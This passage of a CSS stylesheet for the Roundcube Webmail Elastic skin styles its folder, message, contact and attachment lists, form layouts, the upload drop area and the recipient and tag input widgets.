 ul.treelist li ul {
   padding: 0;
 }
 ul.treelist li ul li {
   padding-left: 0;
 }
 ul.treelist li ul li a {
   padding-left: 3em;
 }
 ul.treelist li ul li div.treetoggle {
   left: 1.5em;
 }
 ul.treelist li ul li li a {
   padding-left: 4.5em;
 }
 ul.treelist li ul li li div.treetoggle {
   left: 3em;
 }
 ul.treelist li ul li li li a {
   padding-left: 6em;
 }
 ul.treelist li ul li li li div.treetoggle {
   left: 4.5em;
 }
 ul.treelist li ul li li li li a {
   padding-left: 7.5em;
 }
 ul.treelist li ul li li li li div.treetoggle {
   left: 6em;
 }
 ul.treelist li ul li li li li li a {
   padding-left: 9em;
 }
 ul.treelist li ul li li li li li div.treetoggle {
   left: 7.5em;
 }
 ul.treelist.notree div.treetoggle {
   display: none;
 }
 ul.treelist.notree li > a {
   padding-left: 0.5em;
 }
 /*** Folders list widget ***/
 .folderlist li.mailbox.unread > a {
   padding-right: 2.8em;
   font-weight: bold;
 }
 .folderlist li.mailbox.recent {
   color: blue;
 }
 .folderlist li.mailbox .unreadcount {
   position: absolute;
   top: 0;
   right: 0;
   min-width: 2em;
   line-height: 1.4rem;
   margin: 7.7px;
   padding: 0 0.3em;
   border-radius: 0.4em;
   background: #0099cc;
   color: #fff;
   text-align: center;
   font-weight: bold;
 }
 html.touch .folderlist li.mailbox .unreadcount {
   line-height: 2rem;
   margin: 9.5px;
 }
 .folderlist li.mailbox.recent > .unreadcount {
   background: blue;
   color: #fff;
 }
 .folderlist li.mailbox.root {
   display: none !important;
 }
 .folderlist li a:before {
   content: "\f07b";
   font-weight: 400;
   margin-right: 0.5rem;
 }
 .folderlist li.inbox > a:before {
   content: "\f01c";
   font-weight: 900;
 }
 .folderlist li.trash a:before {
   content: "\f2ed";
   font-weight: 900;
 }
 .folderlist li.trash.empty > a:before {
   content: "\f2ed";
   font-weight: 400;
 }
 .folderlist li.drafts a:before {
   content: "\f303";
   font-weight: 900;
 }
 .folderlist li.sent a:before {
   content: "\f1d8";
   font-weight: 900;
 }
 .folderlist li.junk a:before {
   content: "\f7e4";
   font-weight: 900;
 }
 .folderlist li.archive > a:before {
   content: "\f187";
   font-weight: 900;
 }
 .folderlist.menu a:before {
   margin-left: 0.5em;
 }
 /*** Messages list widget ***/
 .messagelist > thead,
 .messagelist .branch,
 table.fixedcopy {
   display: none;
 }
 .messagelist td {
   border-left: 0;
   width: 2em;
   vertical-align: top;
   font-size: 1rem !important;
 }
 .messagelist td.subject {
   width: 100%;
   padding-right: 0;
   display: flex;
   flex-wrap: wrap;
 }
 .messagelist td.subject a {
   text-decoration: none;
   cursor: default;
 }
 .messagelist td.subject span {
   line-height: 2em;
 }
 .messagelist td.subject span.date {
   font-size: 90%;
   color: #737677;
 }
 .messagelist td.subject span.fromto {
   overflow: hidden;
   text-overflow: ellipsis;
   flex: 1;
   font-size: 90%;
   color: #737677;
   padding-left: 1.5em;
   padding-right: 0.5rem;
 }
 .messagelist td.subject span.subject {
   overflow: hidden;
   text-overflow: ellipsis;
   width: 100%;
 }
 .messagelist td.threads {
   padding: 0 0 0 0.25rem;
   width: 1.5em;
 }
 .messagelist td.flags {
   width: 2.5em;
 }
 .messagelist td.flags > span {
   height: 1.7em;
   line-height: 1.7em;
   display: block;
 }
 .messagelist td.flags > span.flag {
   cursor: pointer;
 }
 .messagelist tr.flagged td,
 .messagelist tr.flagged td.subject span.subject a,
 .messagelist tr.flagged td.subject span.date,
 .messagelist tr.flagged td.subject span.fromto {
   color: #EC1313;
 }
 .messagelist tr.deleted td,
 .messagelist tr.deleted td.subject span.subject a,
 .messagelist tr.deleted td.subject span.date,
 .messagelist tr.deleted td.subject span.fromto {
   color: rgba(44, 54, 58, 0.5);
 }
 .messagelist tr.unread td.subject span.subject {
   font-weight: bold;
 }
 .messagelist tr.unroot td.subject a {
   text-decoration: underline;
 }
 .messagelist tr.thread td.threads div:before {
   content: "\f105";
   cursor: pointer;
   width: 1em;
 }
 .messagelist tr.thread.expanded td.threads div:before {
   content: "\f107";
 }
 .messagelist td.subject span.msgicon.status:before {
   content: "\f111";
   cursor: pointer;
   font-size: 0.4rem;
   width: 1.1rem;
   height: 2rem;
 }
 .messagelist td.subject span.msgicon.status.unread:before {
   content: "\f111";
   color: #ffd452;
   font-size: 0.5rem;
 }
 .messagelist td.subject span.msgicon.status.unreadchildren:before {
   content: "\f111";
   font-weight: 400;
   font-size: 0.5rem;
 }
 .messagelist td.subject span.msgicon.status.replied:before {
   content: "\f3e5";
   font-weight: 900;
   font-size: 1rem;
 }
 .messagelist td.subject span.msgicon.status.forwarded:before {
   content: "\f064";
   font-weight: 900;
   font-size: 1rem;
 }
 .messagelist td.subject span.msgicon.status.replied.forwarded:before {
   content: "\f3e5";
   font-weight: 900;
   font-size: 1rem;
 }
 tr.deleted .messagelist td.subject span.msgicon.status:before {
   content: "\f05e";
   font-weight: 900;
   font-size: 1rem;
 }
 .messagelist span.attachment span {
   color: rgba(115, 118, 119, 0.75);
 }
 .messagelist span.attachment span:before {
   margin: 0;
   content: "\f0c6";
 }
 .messagelist span.attachment span.report:before {
   content: "\f15c";
   font-weight: 400;
 }
 .messagelist span.attachment span.encrypted:before {
   content: "\f023";
 }
 .messagelist span.attachment span.vcard:before {
   content: "\f007";
   font-weight: 400;
 }
 .messagelist span.flagged:before {
   content: "\f024";
 }
 .messagelist tr:hover span.unflagged:before {
   content: "\f024";
   font-weight: 400;
 }
 html.layout-phone .messagelist tr,
 html.touch .messagelist tr {
   position: relative;
 }
 html.layout-phone .messagelist td.flags,
 html.touch .messagelist td.flags {
   top: 0.25rem;
   right: 0;
   bottom: 0;
 }
 html.layout-phone .messagelist td.flags .flag,
 html.touch .messagelist td.flags .flag {
   visibility: hidden;
 }
 html.layout-phone .messagelist td.subject,
 html.touch .messagelist td.subject {
   padding-right: 0.5em;
 }
 html.layout-phone .messagelist td.subject .subject,
 html.touch .messagelist td.subject .subject {
   padding-right: 1.5rem;
 }
 /* Contacts list */
 .contactlist .contact.readonly td {
   font-style: italic;
 }
 .contactlist td.contact:before {
   content: "\f007";
 }
 .contactlist td.contactgroup:before {
   content: "\f0c0";
 }
 .contactlist span.email {
   display: inline;
   color: #737677;
   font-style: italic;
   margin-left: 0.5em;
 }
 .contactlist li a:before {
   margin-right: 0.5rem;
 }
 .contactlist li a.addressbook::before {
   content: "\f2b9";
   font-weight: 400;
 }
 .contactlist li a.contactgroup::before {
   content: "\f0c0";
   font-weight: 900;
 }
 /* Attachments list */
 .attachmentslist {
   padding: 0;
   margin: 0;
   background-color: #fcfcfc;
   border: 1px solid #f4f4f4;
 }
 .attachmentslist:empty {
   padding: 0;
   border: 0;
 }
 .attachmentslist li {
   list-style: none;
   display: inline-flex;
   white-space: nowrap;
   line-height: 2rem;
   padding: 0 0.25em;
   max-width: 100%;
 }
 .attachmentslist li:before {
   content: "\f15b";
   font-weight: 400;
   height: 2rem;
   margin: 0;
 }
 .attachmentslist li.txt:before,
 .attachmentslist li.text:before {
   content: "\f15c";
   font-weight: 400;
 }
 .attachmentslist li.pdf:before {
   content: "\f1c1";
   font-weight: 400;
 }
 .attachmentslist li.odt:before,
 .attachmentslist li.doc:before,
 .attachmentslist li.docx:before,
 .attachmentslist li.msword:before {
   content: "\f1c2";
   font-weight: 400;
 }
 .attachmentslist li.ods:before,
 .attachmentslist li.xls:before,
 .attachmentslist li.xlsx:before,
 .attachmentslist li.msexcel:before {
   content: "\f1c3";
   font-weight: 400;
 }
 .attachmentslist li.rar:before,
 .attachmentslist li.zip:before,
 .attachmentslist li.gz:before {
   content: "\f1c6";
   font-weight: 400;
 }
 .attachmentslist li.image:before,
 .attachmentslist li.jpg:before,
 .attachmentslist li.jpeg:before,
 .attachmentslist li.png:before {
   content: "\f1c5";
   font-weight: 400;
 }
 .attachmentslist li.mp3:before,
 .attachmentslist li.audio:before {
   content: "\f1c7";
   font-weight: 400;
 }
 .attachmentslist li.m4p:before,
 .attachmentslist li.video:before {
   content: "\f1c8";
   font-weight: 400;
 }
 .attachmentslist li.vcard:before {
   content: "\f2bb";
   font-weight: 400;
 }
 .attachmentslist li.html:before {
   content: "\f1c9";
   font-weight: 400;
 }
 .attachmentslist li.odp:before,
 .attachmentslist li.otp:before,
 .attachmentslist li.ppt:before,
 .attachmentslist li.pptx:before,
 .attachmentslist li.ppsx:before,
 .attachmentslist li.vnd.mspowerpoint:before {
   content: "\f1c4";
   font-weight: 400;
 }
 .attachmentslist li a {
   text-decoration: none;
   line-height: 2rem;
   height: 2rem;
 }
 .attachmentslist li a.cancelupload:before,
 .attachmentslist li a.delete:before {
   content: "\f2ed";
   line-height: 2rem;
   height: 2rem;
   margin: 0;
 }
 .attachmentslist li a.dropdown:before {
   margin: 0;
 }
 .attachmentslist li.uploading:before {
   -webkit-animation: spinner-border 1.5s infinite linear;
   animation: spinner-border 1.5s infinite linear;
   content: "\f1ce";
   font-weight: 900;
 }
 .attachmentslist li a.filename {
   display: flex;
   overflow: hidden;
   padding: 0 0.2em;
 }
 .attachmentslist li .attachment-name {
   overflow: hidden;
   text-overflow: ellipsis;
   color: #2c363a;
 }
 .attachmentslist li .attachment-size {
   color: #737677;
   padding-left: 0.25em;
 }
 .keylist {
   padding: 0;
   list-style: none;
 }
 .keylist li {
   line-height: 2;
 }
 .keylist li:before {
   content: "\f084";
   line-height: 1.5;
 }
 #identities-table td.mail:before {
   content: "\f2c2";
 }
 #responses-table td.name:before {
   content: "\f075";
 }
 #filterslist td.name:before {
   content: "\f0b0";
 }
 #filtersetslist td.name:before {
   content: "\f15c";
 }
 #subscription-table li.mailbox a {
   padding-right: 2.5rem;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Common form elements ***/
 #uploadform {
   display: none;
 }
 form.smart-upload,
 input.smart-upload {
   visibility: hidden;
   width: 1px;
   height: 1px;
   opacity: 0;
 }
 .propform:not(.popupmenu) {
   width: 100%;
 }
 .propform .form-check td:not(.title) > label {
   display: block;
   margin: 0;
   line-height: 2rem;
 }
 .propform .form-check td:not(.title) > label label {
   margin-right: 0.5rem;
 }
 .propform td.datetime {
   display: flex;
 }
 .propform td.datetime input:first-child {
   margin-right: 0.5rem;
 }
 .propform td.datetime input:last-child {
   width: 75%;
 }
 .propform td.rowbuttons {
   width: 1%;
   white-space: nowrap;
   vertical-align: top;
 }
 .propform td.rowbuttons span {
   display: none;
 }
 .propform td.rowbuttons a {
   padding: 0;
   line-height: 2.3rem;
   height: 2.3rem;
   font-size: 1rem;
 }
 .propform td.rowbuttons a:before {
   content: "\f067";
   vertical-align: unset;
 }
 @media screen and (min-width: 577px) {
   .propform td.rowbuttons a:before {
     margin: 0 !important;
   }
 }
 .propform td.rowbuttons a.delete:before {
   content: "\f2ed";
 }
 .propform td.rowbuttons a.advanced:before {
   content: "\f013";
 }
 .propform td.rowbuttons a:not(:last-child) {
   margin-right: 0.25rem;
 }
 .propform td.rowactions {
   width: 1%;
   vertical-align: top;
 }
 .propform td.rowactions .form-control {
   width: auto;
 }
 .propform td.rowtargets {
   vertical-align: top;
 }
 .propform td.rowtargets .composite input,
 .propform td.rowtargets .composite textarea,
 .propform td.rowtargets .composite select,
 .propform td.rowtargets .composite .multi-input,
 .propform td.rowtargets .composite .input-group {
   margin-bottom: 0.5rem;
 }
 .propform td.rowtargets .composite .input-group input,
 .propform td.rowtargets .composite .input-group textarea,
 .propform td.rowtargets .composite .input-group select,
 .propform td.rowtargets .composite .input-group .multi-input {
   margin-bottom: 0;
 }
 .propform td.rowtargets .composite br {
   display: block;
 }
 .propform td.rowtargets .input-group {
   margin-bottom: 0.25rem;
 }
 .propform td.rowtargets .input-group *:first-child.input-group-prepend {
   text-align: left;
   min-width: 7.5em;
 }
 .propform td.rowtargets .input-group *:first-child.input-group-prepend > * {
   width: 100%;
 }
 .propform td.rowtargets > .advanced {
   margin-top: 0.25rem;
 }
 .propform td.title {
   padding-top: 0;
   padding-bottom: 0;
 }
 .propform td > .flexbox {
   display: flex;
 }
 .propform td > .flexbox > .multi-input {
   width: 100%;
   margin-left: 0.25rem;
 }
 .propform.groupped.readonly legend {
   margin: 0;
 }
 .propform.groupped.readonly .row.input-group {
   margin-bottom: 0 !important;
 }
 .propform.groupped.readonly label {
   min-width: 7rem;
   background-color: transparent;
   border: 0;
   border-radius: 0;
 }
 .propform.groupped .row.input-group {
   margin-bottom: 0.5rem;
   flex-wrap: nowrap;
 }
 .propform.groupped .row.input-group > *:first-child {
   overflow: hidden;
   text-overflow: ellipsis;
   min-width: 8rem;
 }
 .propform.groupped .row.input-group > *:first-child:not(select) {
   padding: 0;
 }
 @media screen and (max-width: 480px) {
   .propform.groupped .row.input-group > *:first-child {
     min-width: 6rem;
     width: 6rem;
     flex-grow: unset;
   }
 }
 .propform.groupped .row.input-group > *:first-child label {
   width: 100%;
 }
 .propform.groupped .row.input-group > *:nth-child(2) {
   flex-grow: 30;
 }
 .propform.groupped .row.input-group:last-child {
   margin-bottom: 1rem;
 }
 .propform.groupped .row.input-group select {
   text-align: left;
 }
 .propform.groupped .row.input-group.composite select {
   height: auto;
 }
 .propform.groupped .row.input-group .content {
   padding: 0;
   display: flex;
   flex-wrap: wrap;
   border-radius: 0;
 }
 .propform.groupped .row.input-group .content input {
   border-radius: 0;
   border-color: transparent;
 }
 .propform.groupped .row.input-group .content .ff_street {
   width: 100%;
 }
 .propform.groupped .row.input-group .content .ff_locality {
   width: 75%;
 }
 .propform.groupped .row.input-group .content .ff_zipcode {
   width: 25%;
 }
 .propform.groupped .row.input-group .content .ff_country,
 .propform.groupped .row.input-group .content .ff_region {
   width: 50%;
 }
 .propform.groupped .form-control-plaintext {
   flex-grow: 1;
   border: 0;
 }
 .propform .addfield {
   margin: 0;
 }
 .propform .addfield select {
   width: 8rem;
   margin-top: 0.5rem;
 }
 .propform .form-text {
   font-size: 90%;
   color: #737677;
 }
 .propform.row.form-group {
   margin-left: 0;
   margin-right: 0;
 }
 .propform.row.form-group label,
 .propform.row.form-group div {
   padding-left: 0;
   padding-right: 0;
 }
 .propform select + select,
 .propform select + .input-group {
   padding-top: 0.5rem;
 }
 .propform.text-only {
   margin-bottom: 0.25rem;
 }
 .propform.text-only tr {
   margin: 0;
 }
 .propform.text-only label {
   padding-bottom: 0 !important;
 }
 @media screen and (max-width: 576px) {
   .propform.text-only tr {
     display: table-row;
   }
   .propform.text-only td {
     width: auto;
   }
   .propform.text-only td:first-child {
     width: 33%;
   }
   .propform.text-only :not(tr).form-group.row .col-form-label {
     width: 33%;
   }
   .propform.text-only :not(tr).form-group.row > :last-child {
     width: 67%;
   }
 }
 @media screen and (max-width: 576px) {
   .propform table.compact-table .rowactions > select,
   .propform table.compact-table .flexbox > select {
     width: 100%;
   }
   .propform table.compact-table tr {
     display: flex;
     flex-direction: column;
   }
   .propform table.compact-table tr td {
     width: 100%;
     padding: 0.25rem 0 0 0;
   }
   .propform table.compact-table tr td.rowbuttons {
     text-align: right;
     padding-top: 0;
   }
   .propform table.compact-table tr td.rowbuttons a {
     margin-left: 0.5rem;
   }
   .propform table.compact-table tr td.rowbuttons a > span {
     display: inline;
   }
 }
 .propform fieldset:not(.tab-pane):nth-of-type(n+2),
 .formcontent fieldset:not(.tab-pane):nth-of-type(n+2) {
   margin-top: 1em;
 }
 .propform legend,
 .formcontent legend {
   font-weight: bold;
   font-size: 1.2em;
 }
 .propform label,
 .formcontent label {
   -webkit-hyphens: auto;
   -ms-hyphens: auto;
   hyphens: auto;
   overflow: hidden;
   margin-bottom: 0;
 }
 fieldset.advanced > legend {
   width: auto;
   cursor: pointer;
 }
 fieldset.advanced > legend:after {
   float: right;
   margin: 0 0 0 0.25rem;
   line-height: inherit;
   font-size: inherit;
   content: "\f106";
 }
 fieldset.advanced > legend.closed:after {
   content: "\f107";
 }
 @media screen and (max-width: 576px) {
   .formcontent .text-only .form-group:not(tr) {
     margin-bottom: 0.25rem;
   }
   .formcontent .text-only .form-group:not(tr) .col-form-label {
     width: 33%;
   }
   .formcontent .text-only .form-group:not(tr) .col-form-label + span {
     width: 67%;
   }
   html.iframe .formcontent > .propform {
     padding: 0.25rem;
   }
 }
 html.ms .propform .row:not(.form-check) > td {
   display: flex;
   flex-wrap: wrap;
 }
 @media screen and (min-width: 576px) {
   html.ms .propform .row.form-check > td {
     display: flex;
   }
 }
 .formcontainer {
   display: flex;
   flex-direction: column;
   justify-content: flex-start;
   overflow-y: hidden !important;
 }
 .formcontainer .formcontent {
   overflow-x: hidden;
   overflow-y: auto;
 }
 .formcontainer .formbuttons {
   padding: 0.5rem 1rem;
 }
 .formcontainer .formbuttons button {
   margin-right: 0.5rem;
 }
 html.iframe.ipad .formcontainer .formbuttons,
 html.iframe.webkit.tablet .formcontainer .formbuttons {
   min-height: 4rem;
 }
 html.layout-small .formcontainer,
 html.layout-phone .formcontainer {
   display: initial;
   overflow-y: auto !important;
 }
 html.layout-small .formcontainer .formcontent,
 html.layout-phone .formcontainer .formcontent {
   overflow: initial !important;
 }
 html.layout-small .formcontainer .formbuttons,
 html.layout-phone .formcontainer .formbuttons {
   display: none;
 }
 .formcontent:not(.popupmenu) {
   padding: 1rem;
 }
 .formcontent .row {
   margin-right: 0;
   margin-left: 0;
 }
 .formcontent .row .col,
 .formcontent .row .col-2,
 .formcontent .row .col-4,
 .formcontent .row .col-6,
 .formcontent .row .col-8,
 .formcontent .row .col-10,
 .formcontent .row .col-12,
 .formcontent .row .col-sm,
 .formcontent .row .col-sm-2,
 .formcontent .row .col-sm-4,
 .formcontent .row .col-sm-6,
 .formcontent .row .col-sm-8,
 .formcontent .row .col-sm-10,
 .formcontent .row .col-sm-12 {
   padding: 0;
 }
 .formcontent .row .form-control-plaintext,
 .formcontent .row label.col-form-label {
   padding: 5px 5px 5px 0;
 }
 .formcontent .row .form-control-plaintext {
   padding-bottom: 0;
   border: 0;
 }
 @media screen and (max-width: 576px) {
   .formcontent .row.form-group > td label {
     padding-bottom: 0;
   }
 }
 .formcontent .row.form-check {
   padding: 0;
   display: flex;
   flex-wrap: nowrap;
 }
 @media screen and (max-width: 576px) {
   .formcontent .row.form-check .col-6 {
     max-width: 100%;
     flex: auto;
   }
   .formcontent .row.form-check > *:last-child {
     width: 1%;
     min-width: 2.6rem;
   }
   .formcontent .row.form-check.with-link > *:last-child {
     min-width: 8rem;
   }
 }
 .formcontent .row.form-check .form-check-input {
   margin: 0.5rem 0;
 }
 .formcontent .row.form-check .custom-switch + a {
   line-height: 2;
   vertical-align: bottom;
 }
 .formcontent .row.form-check td > label {
   padding-bottom: 0;
 }
 .formcontent .nav-tabs {
   margin-bottom: 1rem;
 }
 .formcontent .nav-tabs:empty {
   display: none;
 }
 .formcontent .hint {
   font-style: italic;
   color: #737677;
 }
 .formcontent.raweditor {
   height: 100%;
 }
 .formcontent.raweditor form {
   height: 100%;
 }
 .formcontent.raweditor textarea {
   font-family: monospace;
   height: 100%;
 }
 .formcontent.raweditor .CodeMirror {
   border: 1px solid #ced4da;
   border-radius: 0.3rem;
   height: 100%;
   color: #2c363a;
 }
 .formcontent.raweditor .CodeMirror-focused {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .formcontent.raweditor .CodeMirror-linebackground.line-error {
   background-color: #EC1313;
   opacity: 0.4;
 }
 .formcontent.raweditor .errorGutter {
   width: 0.8em;
 }
 @media screen and (max-width: 320px) {
   .formcontent .col-form-label {
     flex: auto;
     max-width: 100%;
   }
   .formcontent .col-6,
   .formcontent .col-8,
   .formcontent .col-10 {
     flex: auto;
     max-width: 100%;
   }
 }
 /* Some common icons for "iconized inputs" */
 .input-group .icon {
   text-decoration: none;
   padding: 5px 0.5rem;
 }
 .input-group .icon.input-group-text {
   min-width: 2.4rem;
 }
 .input-group .icon:before {
   margin: 0 !important;
   line-height: 1;
   font-size: 1.1em;
 }
 .input-group .icon.user:before {
   content: "\f007";
 }
 .input-group .icon.pass:before {
   content: "\f023";
 }
 .input-group .icon.host:before {
   content: "\f015";
 }
 .input-group .icon.language.before {
   content: "\f0ac";
 }
 .input-group .icon.cancel:before {
   content: "\f00d";
 }
 .input-group .icon.delete:before {
   content: "\f2ed";
 }
 .input-group .icon.edit:before {
   content: "\f303";
 }
 .input-group .icon.add:before {
   content: "\f067";
 }
 .input-group .icon.add.recipient:before {
   content: "\f0c0";
 }
 .input-group .icon.search:before {
   content: "\f002";
 }
 .input-group .icon.filter:before {
   content: "\f0b0";
 }
 .input-group .icon.key:before {
   content: "\f084";
 }
 .input-group .icon .inner {
   display: none;
 }
 .input-group a:focus {
   background-color: rgba(0, 153, 204, 0.25);
   outline: 0;
 }
 .proplist {
   margin-bottom: 0;
   padding: 0;
 }
 .proplist li {
   list-style-type: none;
   line-height: 2rem;
   margin-bottom: 0.25rem;
   display: flex;
   align-items: center;
 }
 .proplist li:last-child {
   margin-bottom: 0;
 }
 .proplist li input[type=radio] {
   margin-right: 0.5em;
 }
 .proplist li input[type=radio]:disabled + label {
   opacity: 0.5;
 }
 .proplist li label:not(.input-group-text) {
   margin: 0;
   line-height: 2rem;
 }
 .proplist li select {
   width: auto;
   display: inline;
 }
 .checklist > div {
   line-height: 2rem;
   display: block;
 }
 .checklist .custom-control-label:before,
 .checklist .custom-control-label:after {
   margin: calc(2px * -1) 0 0 0;
 }
 .checklist > div + br {
   display: none;
 }
 /*** Forms in popups ***/
 .popup form.propform {
   padding: 0.25rem;
   overflow-x: hidden;
 }
 .popupmenu.form.nolist {
   padding: 0 0.5rem;
 }
 .popupmenu.form ul {
   list-style-type: none;
   padding: 0;
   margin: 0;
 }
 .popupmenu.form li:not(.separator) {
   padding: 0 1rem;
 }
 .popupmenu.form li:not(.separator) label {
   margin: 0;
   line-height: 35px;
 }
 .popupmenu.form li:not(.separator) label input {
   margin-right: 0.5rem;
 }
 .popupmenu.form input {
   vertical-align: middle;
 }
 .popupmenu.form select {
   margin: 0.5rem 0;
 }
 .popupmenu.form .buttons {
   text-align: center;
   padding: 0.5rem;
 }
 /*** Smart list (multiple input) field ***/
 .multi-input > .content {
   max-height: 11.65em;
   overflow: hidden;
   overflow-y: auto;
   border-radius: 0.25rem;
   border: 1px solid #ced4da;
 }
 .multi-input > .content.focused {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .multi-input a.icon.reset:before {
   content: "\f2ed";
 }
 .multi-input input.form-control {
   padding-left: 0.75rem;
   height: auto;
 }
 .multi-input input,
 .multi-input input:focus,
 .multi-input .input-group-text {
   border-radius: 0;
   border: 0;
   border-bottom: 1px solid #ced4da;
   box-shadow: none;
 }
 .multi-input .input-group-text {
   border-left: 1px solid #ced4da;
 }
 .multi-input .input-group-append {
   margin-left: 0;
 }
 .multi-input .input-group {
   margin: 0 !important;
   flex-wrap: nowrap;
 }
 .multi-input .input-group:last-child * {
   border-bottom: 0;
 }
 .multi-input + .btn {
   margin-top: 0.5rem;
 }
 .multi-input.is-invalid > .content {
   border: 1px solid #EC1313;
 }
 .multi-input.is-invalid > .content.focused {
   border-color: #EC1313;
   box-shadow: 0 0 0 0.2rem rgba(236, 19, 19, 0.25);
 }
 .multi-input.is-invalid > .invalid-feedback {
   display: inline-block;
 }
 /*** Files upload widget with list of files, upload form and drop area ***/
 .file-upload {
   padding: 1rem 1rem 12rem;
   margin: 0 1rem 0.25rem 1rem;
   border-radius: 0.5rem;
   border: 0.2rem dashed #d4dbde;
 }
 fieldset .file-upload {
   margin: 0;
 }
 .file-upload .upload-form {
   text-align: center;
   padding-bottom: 1em;
 }
 .file-upload .upload-form a.btn,
 .file-upload .upload-form button {
   margin-bottom: 0.25rem;
 }
 .file-upload .hint {
   margin-bottom: 0.5rem;
   color: #737677;
   text-align: center;
 }
 .file-upload .attachmentslist {
   border: 0;
   background: transparent;
 }
 .file-upload .attachmentslist li {
   position: relative;
   display: flex;
   padding-right: 1.5em;
   margin: 0.15em 0;
 }
 .file-upload .attachmentslist li a.filename {
   flex: 1;
 }
 .file-upload .attachmentslist li a.delete,
 .file-upload .attachmentslist li a.cancelupload {
   position: absolute;
   right: 0.25em;
   width: auto;
 }
 .file-upload .attachmentslist li a.dropdown {
   margin-right: 0.5em;
 }
 .file-upload .attachmentslist li .inner {
   display: none;
 }
 .file-upload.droptarget {
   padding-bottom: 0.5rem !important;
 }
 .file-upload.droptarget:after {
   content: url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20960%20560%22%3E%0A%3Cpath%20fill%3D%22%23d4dbde%22%20d%3D%22M690%20245c0%209.2-3.5%2017.9-10.1%2024.9l-175%20175c-6.6%206.6-15.3%2010.1-24.9%2010.1-9.2%200-18.4-3.5-24.9-10.1l-175-175c-6.6-7-10.1-15.8-10.1-24.9%200-4.4.9-9.2%202.6-13.6C277.9%20218.3%20291%20210%20305%20210h87.5V35c0-19.2%2015.8-35%2035-35h105c19.2%200%2035%2015.8%2035%2035v175H655c14%200%2027.1%208.3%2032.4%2021.4%201.7%204.4%202.6%209.2%202.6%2013.6zm0%20245H270V350h-70v140c0%2038.5%2031.5%2070%2070%2070h420c38.5%200%2070-31.5%2070-70V350h-70v140z%22%2F%3E%0A%3C%2Fsvg%3E%0A");
   width: 10rem;
   margin: 5rem auto 0 auto;
   display: block;
 }
 .file-upload.droptarget.active {
   border-color: #82a9be;
 }
 .file-upload.droptarget.hover {
   border-color: #82a9be;
   background-color: #c5d7e1;
 }
 /*** Smart recipient input field ***/
 .recipient-input {
   display: flex;
   flex-wrap: wrap;
   padding: 0 0.75rem 4px 0.75rem;
   list-style-type: none;
   cursor: text;
   height: auto;
 }
 .recipient-input.focus {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .recipient-input .recipient {
   display: flex;
   position: relative;
   max-width: 50%;
   border: 1px solid #ced4da;
   background-color: #f1f3f4;
   border-radius: 0.25em;
   padding: 0 0.25em;
   margin-top: 4px;
   margin-right: 0.2em;
   white-space: nowrap;
   cursor: default;
 }
 @media screen and (max-width: 450px) {
   .recipient-input .recipient {
     width: 100%;
     max-width: 100%;
   }
 }
 .recipient-input .name {
   overflow: hidden;
   text-overflow: ellipsis;
   flex-grow: 1;
   display: inline-block;
   line-height: 1.1;
   padding: 3px;
   vertical-align: middle;
 }
 .recipient-input .email {
   text-indent: -5000rem;
   display: inline-block;
   width: 0;
 }
 .recipient-input .quotes {
   position: absolute;
   width: 0;
   opacity: 0;
 }
 .recipient-input a.button.icon {
   font-size: 0.8em;
   cursor: pointer;
   padding: 0;
 }
 .recipient-input a.button.icon:before {
   float: none;
   display: inline-block;
   width: 1em;
   margin: 0;
   line-height: 1.5;
 }
 .recipient-input li {
   max-width: 100%;
 }
 .recipient-input input {
   width: 40px;
   max-width: 100%;
   background: transparent !important;
   border: 0 !important;
   margin-top: 4px;
   outline: 0;
   line-height: 1.5;
 }
 .recipient-input input::-ms-clear {
   display: none;
 }
 /*** Tagedit widget (from jqueryui plugin) ***/
 .tagedit-list {
   display: flex;
   flex-wrap: wrap;
   padding: 0 0.75rem 4px 0.75rem;
   margin: 0;
   list-style-type: none;
   min-height: 2.3rem;
 }
 .tagedit-list + .placeholder {
   display: none;
 }
 .tagedit-list[tabindex="-1"] {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .tagedit-list li.tagedit-listelement-new {
   margin-top: 4px;
 }
 .tagedit-list li.tagedit-listelement-new input {
   width: 15px;
   background: transparent !important;
   border: 0;
   outline: 0;
   margin: 0;
   padding: 0;
   line-height: 1.5;
 }
 .tagedit-list li.tagedit-listelement-new input.tagedit-input-disabled {
   visibility: hidden;
 }
 .tagedit-list li.tagedit-listelement-old {
   max-width: 50%;
   border: 1px solid #ced4da;
   background-color: #f1f3f4;
   border-radius: 0.25em;
   margin-top: 4px;
   margin-right: 0.2em;
   white-space: nowrap;
 }
 .tagedit-list li.tagedit-listelement-old a {
   font-size: 0.8em;
   cursor: pointer;
   display: inline-block;
   width: 1.1em;
   overflow: hidden;
   vertical-align: middle;
   margin-right: 0.2rem;
 }
 .tagedit-list li.tagedit-listelement-old a:before {
   content: "\f00d";
   width: 1em;
   line-height: 1.2;
 }
 .tagedit-list li.tagedit-listelement-old span {
   overflow: hidden;
   text-overflow: ellipsis;
   flex-grow: 1;
   display: inline-block;
   line-height: 1.4;
   padding: 0 0.25rem;
   vertical-align: middle;
 }
 /*** Skin selection widget ***/
 .skinselection {
   white-space: nowrap;
   display: table-row;
 }
 .skinselection > span {
   display: table-cell;
   vertical-align: middle;
   padding: 0.1em 0.5em;
   white-space: normal;
 }
 .skinselection > span:last-child {
   padding-right: 0;
 }
 .skinselection .skinitem input {
   width: auto;
 }
 .skinselection .skinname {
   font-weight: bold;
 }
 .skinselection .skinlicense,
 .skinselection .skinlicense a {
   font-style: italic;
   text-decoration: none;
 }
 .skinselection .skinlicense a:hover {
   text-decoration: underline;
 }
 .skinselection .skinlicense,
 .skinselection .skinauthor {
   font-size: 90%;
 }
 .skinselection .skinthumbnail {
   width: 64px;
   height: 64px;
   border: 1px solid #ced4da;
   background: #fff;
   border-radius: 4px;
 }
 /*** Percent input with jQuery-UI slider ***/
 .input-percent-slider {
   display: flex;
   align-items: center;
 }
 .input-percent-slider input {
   max-width: 4em;
